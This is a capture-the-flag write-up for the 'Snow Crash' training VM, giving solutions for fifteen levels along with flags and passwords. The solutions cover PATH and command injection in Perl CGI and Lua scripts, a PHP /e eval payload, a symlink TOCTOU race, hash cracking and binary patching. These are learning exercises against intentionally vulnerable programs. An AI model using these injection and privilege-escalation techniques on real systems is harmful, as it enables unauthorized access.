# ❄️ Snow Crash

## 📝 Introduction

As a developer, you may have to work on software that will be used by hundreds of people during your career.  
If your software contains weaknesses, it will expose users to risks.  

The **Snow Crash** project is a modest introduction to the vast world of **cybersecurity** — a field where there is no room for mistakes.  
Its purpose is to help you understand common vulnerabilities, exploitation techniques, and how to think logically in order to spot and avoid them.  

## 🎯 Objectives

The goal of this project is to make you discover cybersecurity through a series of small challenges.  
You will encounter different kinds of vulnerabilities and methods of exploitation, giving you a new perspective on IT in general.  

## ⚙️ General Instructions

- Default credentials to start:
```sh
level00:level00
```
- Start a 64-bit virtual machine (you should change the network settings and forward the ssh port to 4242)
```sh
ssh level00@<IP> -p 4242
```
- The goal at each level is either to find the password for the flag user or directly the password for the next level.
- Switch user with `su flagXX`.
- Run the `getflag` command to obtain the token for the next level.
⚠️ Brute-forcing passwords is strictly forbidden. You must justify your methods.

## 📖 Levels

- [LEVEL00](#level00)
- [LEVEL01](#level01)
- [LEVEL02](#level02)
- [LEVEL03](#level03)
- [LEVEL04](#level04)
- [LEVEL05](#level05)
- [LEVEL06](#level06)
- [LEVEL07](#level07)
- [LEVEL08](#level08)
- [LEVEL09](#level09)
- [LEVEL10](#level10)
- [LEVEL11](#level11)
- [LEVEL12](#level12)
- [LEVEL13](#level13)
- [LEVEL14](#level14)

## LEVEL00 

Enumeration:
```sh
grep -r "getflag" /
getent passwd
cat /etc/passwd
getent group sudo
dpkg -l
lsmod
lsof
netstat -tuln
ss -tuln
ps aux
find / -name "fileNAME" 2>/dev/null
find / -user nom_utilisateur 2>/dev/null
find / -type f -perm -u=r 2>/dev/null
find / -type f -perm -u=w 2>/dev/null
find / -type f -perm -u=x 2>/dev/null
find / -type f -executable -user nom_utilisateur 2>/dev/null
find / -group nom_groupe 2>/dev/null
find / -perm -4000 2>/dev/null #file with suid
find / -perm -2000 -type f 2>/dev/null #file with sgid
```
we finally found a files owned by flag00:
```sh
/usr/sbin/john
/rofs/usr/sbin/john
```
Both of theses files have the same string `cdiiddwpgswtgt`.
We searched for basics ciphers and found the Caesarian Shift, more precisely ROT 11.

### Solution

- flag00: nottoohardhere
- level01 password: x24ti5gi3x0ol2eh4esiuxias

## LEVEL01

We found a hash in the file /etc/passwd for the user flag01 :
```sh
getent passwd
cat /etc/passwd
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```
- Crack DES(Data Encryption Standard) hash using John the Ripper.

### Solution

- flag01: abcdefg
- level02 password: f2av5il02puano7naaf6adaaf

## LEVEL02

- Provided .pcap file, open in Wireshark and analyze traffic  and some of them contains datas.
- We see that the password is Password: `ft_wandr...NDRel.L0L` but some characters are just . which is weird. After looking for their hexadecimal value we found that these characters are DEL for delete key.
- Extracted data:
```
f t _ w a n d r DEL DEL DEL N D R e l DEL L 0 L
```
- Final password `ft_waNDReL0L`

### Solution

- flag02: ft_waNDReL0L
- level03 password: kooda2puivaav1idi4f57q8iq

## LEVEL03 

- Binary `level03` has SUID/SGID. 
- After decompiling the binary with Ghidra, we found that the file use the built-in echo.
```c
int main(int argc,char **argv,char **envp)

{
  __gid_t __rgid;
  __uid_t __ruid;
  int iVar1;
  gid_t gid;
  uid_t uid;
  
  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  iVar1 = system("/usr/bin/env echo Exploit me");
  return iVar1;
}
```
- We create a script that will replace the default:
```sh
echo 'getflag' > /tmp/echo
chmod +x /tmp/echo
```
- Exploit PATH injection to execute our malicious script:
```sh
export PATH=/tmp:$PATH
./level03
```

### Solution

- flag03: /
- level04 password: qi0maab88jeaj46qoumi7maus

## LEVEL04

The file level04.pl is a perl script executed via a CGI:
```sh
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
- it's vulnerable to command injection:
```sh
curl -I  http://localhost:4747
curl 'http://localhost:4747/level04.pl?x=$(getflag)'
```

### Solution

- flag04: /
- level05 password: ne2searoevaevoem4ov4ar8ap

## LEVEL05

- Find a readable script:
```sh
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```
```sh
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

```
- Then we create a malicious script in /opt/openarenaserver/ :
```sh
#!/bin/bash
getflag > /tmp/flag
```
- And wait that the script is executed to get the flag
```sh
cat /tmp/flag
```

### Solution

- flag05: /
- level06 password: viuaaale9huek52boumoomioc

## LEVEL06

We have 2 files. One is a binary file with a SUID allowing us to execute it as `flag06`:
```sh
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
```

And the other one is a php script:
```php
<?php
function y($m) { 
	$m = preg_replace("/\./", " x ", $m); 
	$m = preg_replace("/@/", " y", $m); 
	return $m; 
}

function x($y, $z) { 
	$a = file_get_contents($y); 
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
	$a = preg_replace("/\[/", "(", $a); 
	$a = preg_replace("/\]/", ")", $a); 
	return $a; 
}
$r = x($argv[1], $argv[2]); 
print $r;
?>
``` 

The `x` function interpret the first argument as a file and get its content. Then call a series of `preg_replace` that a string to another.  
The interesting line is the first call to `preg_replace` because the syntax differ, the first string end with the modifier `/e`.
```php
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
```
What does it change ? From this [article](https://wiki.php.net/rfc/remove_preg_replace_eval_modifier), *If this modifier is set, preg_replace() does normal substitution of backreferences in the replacement string,
evaluates it as PHP code, and uses the result for replacing the search string.*  
After some searches and string substitution we finally found the input `` ${`getflag`} ``. The backticks will execute `getflag` and we use a variable subtitution `${}` to escape the double quote. Then we wrapped the all to pass the regexp `[x ${`getflag`}]`.


```
echo '[x ${`getflag`}]' > /tmp/file
./level06 /tmp/file
```


https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing

### Solution

- flag06: /
- level07 password: wiok45aaoguiboiki2tuin6ub

## LEVEL07

- Binary echoes LOGNAME:
```sh
int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int iVar2;
  char *buffer;
  gid_t gid;
  uid_t uid;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;
  
  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  pcVar1 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
  iVar2 = system(local_1c);
  return iVar2;
}
```
- Inject with ;:
```sh
export LOGNAME=";getflag"
```

### Solution

- flag07: /
- level08 password: fiumuikeil55xe9cu4dood66h

## LEVEL08

- Binary refuses a file named token:
```sh
int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int __fd;
  size_t __n;
  ssize_t sVar2;
  int in_GS_OFFSET;
  undefined4 *in_stack_00000008;
  int fd;
  int rc;
  char buf [1024];
  undefined1 local_414 [1024];
  int local_14;
  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc == 1) {
    printf("%s [file to read]\n",*in_stack_00000008);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar1 = strstr((char *)in_stack_00000008[1],"token");
  if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",in_stack_00000008[1]);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  __fd = open((char *)in_stack_00000008[1],0);
  if (__fd == -1) {
    err(1,"Unable to open %s",in_stack_00000008[1]);
  }
  __n = read(__fd,local_414,0x400);
  if (__n == 0xffffffff) {
    err(1,"Unable to read fd %d",__fd);
  }
  sVar2 = write(1,local_414,__n);
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return sVar2;
}
```
- Create a symbolic link to bypass name restriction:
```sh
# ln -s existing_source_file optional_symbolic_link
ln -s $PWD/token /tmp/link
./level08 /tmp/link
```

### Solution

- flag08: quif5eloekouj29ke0vouxean
- level09 password: 25749xKZ8L7DkSCwJkT9dyv6f

## LEVEL09

After `cat` token, the content is unreadable because it contains non-printable or binary characters:
```sh
�}�^�
```
Using `xxd`, we can try to decrypt it into ASCII and see the underlying byte values:
```sh
xxd token
```
Using od -c, the file becomes readable character by character, with non-printable characters shown as escape sequences (\n, \t, etc.):
```sh
od -c token
```

### Solution

- flag09: f3iji1ju5yuevaus41q1afiuq
- level10 password: s5cAJpM8ev6XHw998pRWG728z

## LEVEL10

A common vumlnerability present in scripts is TOCTOU, time of check time of use. It is exploited while a verification instruction, like the user permissions, and the opening of the file as a time delay between them.  
To exploit it, symbolic links are created on a controlled file (created by us) and a file that we do not have permissions on it, the desired file.  
By switching continually on them we can pass the access execution (symbolic link pointing to our created file) and open and read the wanted file because the symbolic link updated.    

TOCTOU exploit:
```sh
while true; do
	ln -sf /tmp/mine /tmp/link
	ln -sf /home/user/level10/token /tmp/link
done
```
We listen on the port 6969:
```sh
nc -lvnp 6969
```
And execute multiple times the program to trigger the TOCTOU:
```sh
./level10 /tmp/link 192.168.56.1
```

### Solution

- flag10: woupa2yuojeeaaed06riuj63c
- level11 password: feulo4b72j7edeahuete3no7c

## LEVEL11

The level11.lua is a lua little server which listen on port 5151:
```sh
level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```
It's vulnerable to injection:
```sh
nc 127.0.0.1 5151
hello; getflag > /tmp/flag
```

### Solution

- flag11: /
- level12 password: fa6v5ateaw21peobuub8ipe6s

## LEVEL12

We have a perl script, which listen on port 4646:
```perl
level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```
The function t(x, y) applies some transformations on x: it converts it to uppercase and strips everything after a whitespace.  
Because of the way x is handled, it’s possible to bypass the transformations and execute arbitrary commands:
```sh
echo -e "#!/bin/bash\n getflag>/tmp/flag" > /tmp/SCRIPT
chmod +x /tmp/SCRIPT
curl 'http://localhost:4646/?x=bonjour$(/*/SCRIPT)&y=hello'
```
- Here,` $(/*/SCRIPT)` executes your script, bypassing the uppercase/whitespace restrictions.

You can also use log files to help build your injection command:
```sh
cat /var/log/apache2/error.log
```

### Solution

- flag12: /
- level13 password: g1qKMiRpXf53AWhDaU7FEkczr

## LEVEL13

We decompile the binary level13 with Ghidra:
```c
void main(void)

{
  __uid_t _Var1;
  undefined4 uVar2;
  
  _Var1 = getuid();
  if (_Var1 != 0x1092) {
    _Var1 = getuid();
    printf("UID %d started us but we we expect %d\n",_Var1,0x1092);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  uVar2 = ft_des("boe]!ai0FB@.:|L6l@A?>qJ}I");
  printf("your token is %s\n",uVar2);
  return;
}
```
The program verifies if the user's `UID` is 4242.  
If it is not then an error message is printed and it exits. Else the function `ft_des` is called with a string `boe]!ai0FB@.:|L6l@A?>qJ}I` returning a string which is printed.  
After taking a look at `ft_des` we can deduce that it is a decoding function, applying an algorithm on the string in argument and returning a decoded string.

Instead of reversing `ft_des` we can create a patch of this binary, changing the execution flow and executing the function `ft_des`. To do that, change the `Jump Zero instruction` to `Jump Not Zero`:
```
        0804859f 74 2a           JZ        LAB_080485cb
        0804859f 75 2a           JNZ        LAB_080485cb # patched instruction
```

> In Ghidra, right click on the instruction, click on `patch instruction` and change `JZ 74 2a ` to `JNZ 75 2a`, press `o` to export the file as `original file`

Executing the patched binary should print the token (decoded string)


### Solution

- flag13: /
- level14 password: 2A31L79asukciNyi8uppkEuSx

## LEVEL14

In this level we have no hints at all on the machine, no owned files, special permissions or even scripts.  
The only thing that can come in our head is to use the previous technique, making a patch of the `getflag` binary and try to obtain the `flag14`. 

We download the getflag binary and open it in Ghidra:
```
            if (iVar7 != 0) {
              fwrite("Check flag.Here is your token : ",1,0x20,stdout);
              _Var6 = getuid();
              __stream = stdout;
              if (_Var6 == 0xbbe) {
                pcVar4 = (char *)ft_des("H8B8h_20B4J43><8>\\ED<;j@3");
                fputs(pcVar4,__stream);
              }

              ...

              else {
                if (_Var6 != 0xbc6) goto LAB_08048e06;
                pcVar4 = (char *)ft_des("g <t61:|4_|!@IF.-62FH&G~DCK/Ekrvvdwz?v|");
                fputs(pcVar4,__stream);
              }
              ...
```

The program get the `UID` of the flags and then call `ft_des` with the a fixed string in argument. In the file `/etc/passwd` we get the `UID` of `flag14` which is `3014 (0xbc6)`, witch this we can identify which instructions execute.  
Now we need to change the execution flow by editing a jump instruction. We will take the first compare and jump:
```
        08048b0a 3d be 0b        CMP        EAX,0xbbe                       if (_Var6 == 0xbbe) {  
                 00 00                                                          ....
        08048b0f 0f 84 b6        JZ         LAB_08048ccb
                 01 00 00
```

And we update the `JZ` to `JNZ`, and pointing to the instructions where the flag14's instructions are:
```
        LAB_08048de5
...
        08048df3 e8 0c f8        CALL    ft_des    pcVar4 = (char *)ft_des("g <t61:|4_|!@IF.-62FH&G~DCK/Ekrvvdwz?v|");
                 ff ff

```

The final result should look like this:
```
                                        if (iVar7 != 0) {
                                          fwrite("Check flag.Here is your token : ",1,0x20,stdout);
                                          _Var6 = getuid();
                                          __stream = stdout;
08048b0f 0f 85 d0   JNZ   LAB_08048de5    if (_Var6 == 0xbbe) {
         02 00 00
                                            pcVar4 = (char *)ft_des("G8H.6,=4k5J0<cd/D@>>B:>:4");
                                            fputs(pcVar4,__stream);
                                          }
                                          else {
                                            pcVar4 = (char *)ft_des("g <t61:|4_|!@IF.-62FH&G~DCK/Ekrvvdwz?v|");
                                            fputs(pcVar4,__stream);
                                          }
```

### Solution

- flag14: 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
